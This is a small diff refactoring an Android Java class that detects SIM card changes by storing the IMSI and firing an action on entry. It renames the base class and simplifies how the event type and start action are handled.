@@ -19,7 +19,7 @@ import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerSim;
 import com.android.service.util.Check;
 
-public class EventSim extends EventBase implements Observer<Sim> {
+public class EventSim extends BaseEvent implements Observer<Sim> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventSim"; //$NON-NLS-1$
 
@@ -36,11 +36,7 @@ public class EventSim extends EventBase implements Observer<Sim> {
 	}
 
 	@Override
-	public boolean parse(EventConf event) {
-		super.setEvent(event);
-
-		actionOnEnter = event.getAction();
-
+	public boolean parse(EventConf conf) {
 		return true;
 	}
 
@@ -60,7 +56,7 @@ public class EventSim extends EventBase implements Observer<Sim> {
 			return 0;
 		}
 
-		Markup storedImsi = new Markup(EventType.EVENT_SIM_CHANGE);
+		Markup storedImsi = new Markup(getType());
 
 		// Vediamo se gia' c'e' un markup
 		if (storedImsi.isMarkup() == true) {
@@ -93,6 +89,6 @@ public class EventSim extends EventBase implements Observer<Sim> {
 	}
 
 	public void onEnter() {
-		trigger(actionOnEnter);
+		triggerStartAction();
 	}
 }
